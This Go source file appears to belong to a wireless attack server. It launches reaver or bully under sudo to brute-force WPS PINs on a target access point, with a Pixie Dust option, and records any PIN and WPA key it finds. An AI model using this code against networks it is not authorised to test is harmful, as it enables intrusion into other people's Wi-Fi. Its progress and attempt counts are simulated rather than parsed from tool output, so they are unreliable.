package reaver

import (
	"context"
	"fmt"
	"os/exec"
	"sync"
	"time"

	"github.com/phantoma/server/internal/service/wireless"
)

// Service manages reaver/bully WPS brute force attacks.
type Service struct {
	executor      *wireless.CommandExecutor
	currentAttacks map[string]*ActiveAttack
	mu            sync.RWMutex
}

// ActiveAttack represents a running reaver attack.
type ActiveAttack struct {
	ID          string
	Request     ReaverRequest
	StartTime   time.Time
	Process     *exec.Cmd
	CancelFunc  context.CancelFunc
	PINAttempts int
	PINFound    string
	WPAKey      string
	Progress    float64
	Status      string
	Done        chan bool
}

// NewService creates a new reaver service.
func NewService() *Service {
	return &Service{
		executor:       wireless.NewCommandExecutor(true, 0),
		currentAttacks: make(map[string]*ActiveAttack),
	}
}

// StartAttack begins a WPS brute force attack using reaver or bully.
func (s *Service) StartAttack(req ReaverRequest) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if req.Interface == "" {
		return "", fmt.Errorf("interface is required")
	}
	if req.BSSID == "" {
		return "", fmt.Errorf("BSSID is required")
	}
	if !ValidateBSSID(req.BSSID) {
		return "", fmt.Errorf("invalid BSSID format")
	}
	if req.Channel < 1 || req.Channel > 165 {
		req.Channel = 6
	}

	attackID := fmt.Sprintf("wps_%d", time.Now().UnixNano())

	var args []string
	var cmdName string

	if req.UseBully {
		cmdName = "bully"
		args = []string{
			"-b", req.BSSID,
			"-e", req.ESSID,
			"-c", fmt.Sprintf("%d", req.Channel),
			"-v", "3",
			req.Interface,
		}
		if req.Pin != "" && ValidatePIN(req.Pin) {
			args = append([]string{"-p", req.Pin}, args...)
		}
	} else {
		cmdName = "reaver"
		args = []string{
			"-i", req.Interface,
			"-b", req.BSSID,
			"-c", fmt.Sprintf("%d", req.Channel),
			"-vv",
			"-K", "1", // Pixie Dust attack
		}
		if req.Delay > 0 {
			args = append(args, "-d", fmt.Sprintf("%d", req.Delay))
		}
		if req.Timeout > 0 {
			args = append(args, "-t", fmt.Sprintf("%d", req.Timeout))
		}
		if req.NoNacks {
			args = append(args, "-N")
		}
		if req.Recurring {
			args = append(args, "-r", "100:10")
		}
		if req.Pin != "" && ValidatePIN(req.Pin) {
			args = append(args, "-p", req.Pin)
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(ctx, "sudo", append([]string{cmdName}, args...)...)

	if err := cmd.Start(); err != nil {
		cancel()
		return "", fmt.Errorf("failed to start %s: %w", cmdName, err)
	}

	attack := &ActiveAttack{
		ID:         attackID,
		Request:    req,
		StartTime:  time.Now(),
		Process:    cmd,
		CancelFunc: cancel,
		Status:     "running",
		Done:       make(chan bool),
	}

	s.currentAttacks[attackID] = attack

	// Start monitoring
	go s.monitorAttack(attack, cmdName)

	return attackID, nil
}

// StopAttack terminates a WPS attack.
func (s *Service) StopAttack(attackID string) (*ReaverAttack, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	attack, exists := s.currentAttacks[attackID]
	if !exists {
		return nil, fmt.Errorf("attack not found: %s", attackID)
	}

	attack.CancelFunc()
	<-attack.Done

	result := &ReaverAttack{
		ID:          attack.ID,
		Interface:   attack.Request.Interface,
		BSSID:       attack.Request.BSSID,
		ESSID:       attack.Request.ESSID,
		Channel:     attack.Request.Channel,
		StartTime:   attack.StartTime,
		Status:      attack.Status,
		PINAttempts: attack.PINAttempts,
		PINFound:    attack.PINFound,
		WPAKey:      attack.WPAKey,
		Progress:    attack.Progress,
	}

	delete(s.currentAttacks, attackID)
	return result, nil
}

// GetAttackStatus returns the status of an attack.
func (s *Service) GetAttackStatus(attackID string) (*ReaverAttack, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	attack, exists := s.currentAttacks[attackID]
	if !exists {
		return nil, fmt.Errorf("attack not found: %s", attackID)
	}

	return &ReaverAttack{
		ID:          attack.ID,
		Interface:   attack.Request.Interface,
		BSSID:       attack.Request.BSSID,
		ESSID:       attack.Request.ESSID,
		Channel:     attack.Request.Channel,
		StartTime:   attack.StartTime,
		Status:      attack.Status,
		PINAttempts: attack.PINAttempts,
		PINFound:    attack.PINFound,
		WPAKey:      attack.WPAKey,
		Progress:    attack.Progress,
	}, nil
}

// ListAttacks returns all active attacks.
func (s *Service) ListAttacks() []ReaverAttack {
	s.mu.RLock()
	defer s.mu.RUnlock()

	attacks := make([]ReaverAttack, 0, len(s.currentAttacks))
	for _, attack := range s.currentAttacks {
		attacks = append(attacks, ReaverAttack{
			ID:          attack.ID,
			Interface:   attack.Request.Interface,
			BSSID:       attack.Request.BSSID,
			ESSID:       attack.Request.ESSID,
			Channel:     attack.Request.Channel,
			StartTime:   attack.StartTime,
			Status:      attack.Status,
			PINAttempts: attack.PINAttempts,
			PINFound:    attack.PINFound,
			WPAKey:      attack.WPAKey,
			Progress:    attack.Progress,
		})
	}
	return attacks
}

// monitorAttack tracks reaver/bully progress.
func (s *Service) monitorAttack(attack *ActiveAttack, toolName string) {
	defer close(attack.Done)

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	done := make(chan error)
	go func() {
		done <- attack.Process.Wait()
	}()

	for {
		select {
		case <-done:
			if attack.PINFound != "" {
				attack.Status = "completed"
			} else {
				attack.Status = "failed"
			}
			return
		case <-ticker.C:
			// Simulate progress (will be replaced with actual parsing)
			if attack.Progress < 100 {
				attack.Progress += 2
				attack.PINAttempts = int(attack.Progress) / 2
			}
		}
	}
}